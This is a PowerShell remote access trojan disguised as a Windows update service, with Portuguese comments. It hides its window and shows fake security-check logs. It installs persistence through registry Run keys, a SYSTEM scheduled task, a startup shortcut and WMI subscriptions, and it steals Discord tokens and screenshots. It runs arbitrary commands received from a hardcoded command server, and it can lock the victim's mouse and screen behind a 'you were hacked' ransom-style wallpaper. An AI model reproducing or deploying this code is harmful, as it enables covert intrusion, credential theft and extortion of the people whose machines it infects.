<#
.SYNOPSIS
Windows Critical System Component - Complete Edition
.DESCRIPTION
Funções completas para controle remoto e lock total
.NOTES
Versão: 10.0.19045.1 - Lock Edition
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$debugLog = "$env:TEMP\rat_debug.log"
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
$wallpaperPath = "$env:TEMP\wallpaper_hack.bmp"

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { 
        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
        return "ERRO_AO_REMOVER" 
    }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { 
        Write-DebugLog "Erro em Get-RATUsers: $_"
        return "ERRO_AO_LISTAR" 
    }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { 
        Write-DebugLog "Erro em Add-UserToList: $_"
        return $false 
    }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== PERSISTÊNCIA MÚLTIPLA E REFORÇADA =====
function Install-Persistence {
    try {
        Write-DebugLog "Instalando persistência múltipla..."
        
        # Garantir que a pasta existe
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        
        # Copiar script para local de instalação
        Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
        Write-DebugLog "Script copiado para: $scriptPath"
        
        # ===== MÉTODO 1: REGISTRO (HKLM\Run) =====
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
            Write-DebugLog "✓ Persistência adicionada ao registro (HKLM)"
        } catch {
            Write-DebugLog "✗ Erro no registro HKLM: $_"
            
            # Fallback para HKCU se HKLM falhar
            try {
                $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
                Write-DebugLog "✓ Persistência adicionada ao registro (HKCU)"
            } catch {
                Write-DebugLog "✗ Erro no registro HKCU: $_"
            }
        }
        
        # ===== MÉTODO 2: TAREFA AGENDADA (MAIS CONFIÁVEL) =====
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
            Write-DebugLog "✓ Tarefa agendada criada (SYSTEM)"
        } catch {
            Write-DebugLog "✗ Erro na tarefa agendada: $_"
        }
        
        # ===== MÉTODO 3: RUNONCE (EXECUTA MESMO SE OUTROS FALHAREM) =====
        try {
            $regRunOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
            Set-ItemProperty -Path $regRunOncePath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
            Write-DebugLog "✓ Persistência adicionada ao RunOnce"
        } catch {
            Write-DebugLog "✗ Erro no RunOnce: $_"
        }
        
        # ===== MÉTODO 4: ATALHO NA PASTA DE INICIALIZAÇÃO =====
        try {
            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $shortcutPath = "$startupPath\$installName.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $shortcut.Save()
            Write-DebugLog "✓ Atalho adicionado à pasta de inicialização"
        } catch {
            Write-DebugLog "✗ Erro ao criar atalho: $_"
        }
        
        # ===== MÉTODO 5: WMI EVENT SUBSCRIPTION (AVANÇADO) =====
        try {
            $filterName = "RATFilter_$(Get-Random)"
            $consumerName = "RATConsumer_$(Get-Random)"
            
            $filterArgs = @{
                Name = $filterName
                EventNameSpace = 'root\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
            }
            $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
            
            $consumerArgs = @{
                Name = $consumerName
                CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            }
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
            
            $bindingArgs = @{ Filter = $filter; Consumer = $consumer }
            $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
            Write-DebugLog "✓ WMI Event Subscription criada"
        } catch {
            Write-DebugLog "✗ Erro no WMI: $_"
        }
        
        # Ocultar arquivo
        attrib +h +s +r $scriptPath
        Write-DebugLog "Arquivo ocultado"
        Write-DebugLog "=" * 60
        Write-DebugLog "PERSISTÊNCIA INSTALADA COM SUCESSO"
        Write-DebugLog "=" * 60
        
    } catch {
        Write-DebugLog "ERRO GERAL na persistência: $_"
    }
}

# ===== VERIFICAR SE JÁ ESTÁ INSTALADO =====
if (-not (Test-Path $scriptPath)) {
    Install-Persistence
} else {
    # Verifica se o script atual é diferente do instalado (atualização)
    $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
    $installedScript = Get-Content $scriptPath -Raw -ErrorAction SilentlyContinue
    if ($currentScript -ne $installedScript) {
        Write-DebugLog "Script atualizado, reinstalando persistência"
        Install-Persistence
    }
}

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        Write-DebugLog "Screenshot capturado"
        return "SCREEN:$base64"
    } catch {
        Write-DebugLog "Erro ao capturar screenshot: $_"
        return "SCREEN_ERROR"
    }
}

# ===== FUNÇÃO PARA CRIAR WALLPAPER HACKEADO =====
function Create-HackWallpaper {
    try {
        Write-DebugLog "=" * 60
        Write-DebugLog "CRIANDO WALLPAPER HACKEADO"
        Write-DebugLog "=" * 60
        
        $width = 1920
        $height = 1080
        $bitmap = New-Object System.Drawing.Bitmap $width, $height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.Clear([System.Drawing.Color]::Black)
        
        $fontGrande = New-Object System.Drawing.Font("Arial Black", 60, [System.Drawing.FontStyle]::Bold)
        $fontMedio = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
        $fontPequeno = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
        
        $brushVermelho = [System.Drawing.Brushes]::Red
        $brushBranco = [System.Drawing.Brushes]::White
        $brushAmarelo = [System.Drawing.Brushes]::Orange
        
        $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 100)
        $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 180)
        $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 300)
        $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 370)
        $graphics.DrawString("CRYPTO-LOCKED", $fontMedio, $brushAmarelo, 200, 470)
        $graphics.DrawString("ANLGUUR", $fontPequeno, $brushBranco, 200, 570)
        $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 650)
        
        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 5)
        $graphics.DrawRectangle($pen, 50, 50, $width - 100, $height - 100)
        $pen.Width = 2
        $pen.Color = [System.Drawing.Color]::White
        $graphics.DrawRectangle($pen, 70, 70, $width - 140, $height - 140)
        
        $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Write-DebugLog "Wallpaper criado em: $wallpaperPath"
        return $true
    } catch {
        Write-DebugLog "Erro ao criar wallpaper: $_"
        return $false
    }
}

# ===== FUNÇÃO PARA ALTERAR WALLPAPER =====
function Set-Wallpaper {
    try {
        $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void Set(string path) {
        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
    }
}
'@
        Add-Type -TypeDefinition $code -ErrorAction Stop
        [Wallpaper]::Set($wallpaperPath)
        Write-DebugLog "Wallpaper aplicado com sucesso"
        return $true
    } catch {
        Write-DebugLog "Erro ao aplicar wallpaper: $_"
        return $false
    }
}

# ===== TRAVAR MOUSE (VERSÃO AGRESSIVA) =====
$script:mouseLocked = $false
$script:mouseThread = $null
$script:mouseThread2 = $null

function Lock-Mouse {
    try {
        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        Write-DebugLog "=" * 60
        Write-DebugLog "TRAVANDO MOUSE"
        Write-DebugLog "=" * 60
        
        $script:mouseLocked = $true
        
        # ClipCursor (API nativa)
        try {
            $cSharpCode = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class MouseTrap {
    [DllImport("user32.dll")]
    public static extern bool ClipCursor(ref RECT lpRect);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int left, top, right, bottom;
    }
    
    public static void Lock() {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = 1;
        rect.bottom = 1;
        ClipCursor(ref rect);
    }
    
    public static void Unlock() {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = Screen.PrimaryScreen.Bounds.Width;
        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
        ClipCursor(ref rect);
    }
}
'@
            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
            [MouseTrap]::Lock()
            Write-DebugLog "✓ ClipCursor aplicado"
        } catch {
            Write-DebugLog "✗ ClipCursor falhou: $_"
        }
        
        # Thread rápida
        $script:mouseThread = [System.Threading.Thread]::new({
            while ($script:mouseLocked) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 1
                } catch {}
            }
        })
        $script:mouseThread.IsBackground = $true
        $script:mouseThread.Start()
        Write-DebugLog "✓ Thread rápida iniciada"
        
        return "MOUSE_LOCKED"
    } catch {
        Write-DebugLog "ERRO: $_"
        return "MOUSE_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $script:mouseLocked = $false
        
        try { [MouseTrap]::Unlock() } catch {}
        if ($script:mouseThread -and $script:mouseThread.IsAlive) { $script:mouseThread.Abort() }
        
        return "MOUSE_UNLOCKED"
    } catch {
        return "MOUSE_UNLOCK_ERROR"
    }
}

# ===== TELA PRETA =====
$script:blackScreenForm = $null

function Black-Screen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        return "BLACK_SCREEN_ACTIVATED"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
            $_.Close()
        }
        return "BLACK_SCREEN_DEACTIVATED"
    } catch {
        return "UNLOCK_SCREEN_ERROR"
    }
}

# ===== LOCK TOTAL =====
function Lock-Total {
    Lock-Mouse | Out-Null
    Black-Screen | Out-Null
    return "LOCK_TOTAL_ACTIVATED"
}

function Unlock-Total {
    Unlock-Mouse | Out-Null
    Unlock-Screen | Out-Null
    return "LOCK_TOTAL_DEACTIVATED"
}

# ===== MOUSE / TECLADO =====
function Move-Mouse { param($x,$y) try { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x,[int]$y); return "OK" } catch { return "MOUSE_ERROR" } }
function Click-Mouse { try { [System.Windows.Forms.SendKeys]::SendWait("{ENTER}"); return "OK" } catch { return "CLICK_ERROR" } }
function Send-Key { param($key) try { [System.Windows.Forms.SendKeys]::SendWait($key); return "OK" } catch { return "KEY_ERROR" } }

# ===== COMANDOS =====
function Get-FileList { param($Path) try { Get-ChildItem $Path -ErrorAction SilentlyContinue | Select-Object Name | ConvertTo-Json -Compress } catch { return "[]" } }
function Execute-Command { param($Cmd) try { Invoke-Expression $Cmd 2>&1 | Out-String } catch { return "Erro: $_" } }
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @("$env:APPDATA\discord\Local Storage\leveldb")
        foreach ($path in $paths) { if (Test-Path $path) { Get-ChildItem "$path\*.ldb" | ForEach-Object { $content = Get-Content $_.FullName -Raw; $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}'); $matches = $regex.Matches($content); foreach ($match in $matches) { $tokens += $match.Value } } } }
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch { return "TOKENS_ERROR" }
}
function Get-ProcessList { try { Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress } catch { return "PROCESS_ERROR" } }
function Power-Control { param($Action) try { switch ($Action) { "shutdown" { Stop-Computer -Force } "reboot" { Restart-Computer -Force } } return "POWER_$Action" } catch { return "POWER_ERROR" } }

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        Write-DebugLog "Conectado ao servidor"
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            Write-DebugLog "Comando recebido: $cmd"
            
            if ($cmd -eq "screenshot") { $writer.WriteLine((Get-ScreenCapture)) }
            elseif ($cmd -eq "click") { $writer.WriteLine((Click-Mouse)) }
            elseif ($cmd -eq "discord") { $writer.WriteLine((Get-DiscordToken)) }
            elseif ($cmd -eq "processes") { $writer.WriteLine((Get-ProcessList)) }
            elseif ($cmd -eq "shutdown") { $writer.WriteLine((Power-Control "shutdown")) }
            elseif ($cmd -eq "reboot") { $writer.WriteLine((Power-Control "reboot")) }
            elseif ($cmd -eq "list_users") { $writer.WriteLine((Get-RATUsers)) }
            elseif ($cmd -eq "remove_current_user") { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
            elseif ($cmd -eq "lock_mouse") { $writer.WriteLine((Lock-Mouse)) }
            elseif ($cmd -eq "unlock_mouse") { $writer.WriteLine((Unlock-Mouse)) }
            elseif ($cmd -eq "black_screen") { $writer.WriteLine((Black-Screen)) }
            elseif ($cmd -eq "unlock_screen") { $writer.WriteLine((Unlock-Screen)) }
            elseif ($cmd -eq "lock_total") { $writer.WriteLine((Lock-Total)) }
            elseif ($cmd -eq "unlock_total") { $writer.WriteLine((Unlock-Total)) }
            elseif ($cmd -eq "set_wallpaper_hack") { 
                if (Create-HackWallpaper -and (Set-Wallpaper)) { 
                    $writer.WriteLine("WALLPAPER_HACK_SET") 
                } else { 
                    $writer.WriteLine("WALLPAPER_ERROR") 
                }
            }
            elseif ($cmd -eq "test") { $writer.WriteLine("PONG") }
            elseif ($cmd -eq "exit") { break }
            elseif ($cmd -match "^move (\d+) (\d+)$") { $writer.WriteLine((Move-Mouse $matches[1] $matches[2])) }
            elseif ($cmd -match "^key (.+)$") { $writer.WriteLine((Send-Key $matches[1])) }
            elseif ($cmd -match "^ls (.+)$") { $writer.WriteLine((Get-FileList $matches[1])) }
            elseif ($cmd -match "^exec (.+)$") { $writer.WriteLine((Execute-Command $matches[1])) }
            else { $writer.WriteLine("Comando nao reconhecido") }
        }
    } catch {
        Write-DebugLog "Erro na conexao: $_"
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
